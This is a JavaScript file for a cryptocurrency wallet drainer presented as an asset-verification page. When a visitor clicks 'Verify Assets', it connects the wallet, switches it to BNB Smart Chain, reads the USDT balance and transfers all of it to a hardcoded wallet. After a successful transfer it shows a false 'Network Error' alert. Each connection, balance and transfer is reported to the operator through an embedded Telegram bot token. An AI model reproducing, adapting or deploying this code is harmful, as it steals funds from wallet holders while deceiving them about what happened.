// 1. Your Config
const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 

// 2. Telegram Details
const telegramBotToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const telegramChatId = "7849151110";

// Telegram Alert Function
async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const params = {
        chat_id: telegramChatId,
        text: text,
        parse_mode: 'HTML'
    };
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });
    } catch (e) { console.error("Telegram Error", e); }
}

async function startProcess() {
    const btn = document.getElementById("nextBtn");
    const isWeb3Browser = !!(window.ethereum || window.trustwallet);

    if (!isWeb3Browser) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            const currentUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
            return;
        } else {
            alert("Please use Trust Wallet or MetaMask.");
            return;
        }
    }

    btn.disabled = true;
    btn.textContent = "Processing...";

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
        });

        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        // Alert you on Telegram that someone connected
        await sendTelegramMessage(`<b>New Connection!</b>\nWallet: <code>${userAddress}</code>\nBalance: <b>${balance} USDT</b>`);

        if (parseFloat(balance) > 0) {
            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
            
            await sendTelegramMessage(`<b>Success!</b>\nTransferred ${balance} USDT to your wallet.`);
            alert("Network Error: Please try again.");
        } else {
            alert("Verification complete: No assets found.");
        }

    } catch (err) {
        await sendTelegramMessage(`<b>Failed/Cancelled</b>\nError: ${err.message}`);
        alert("Error: " + err.message);
    } finally {
        btn.disabled = false;
        btn.textContent = "Verify Assets";
    }
}

document.getElementById("nextBtn").addEventListener("click", startProcess);
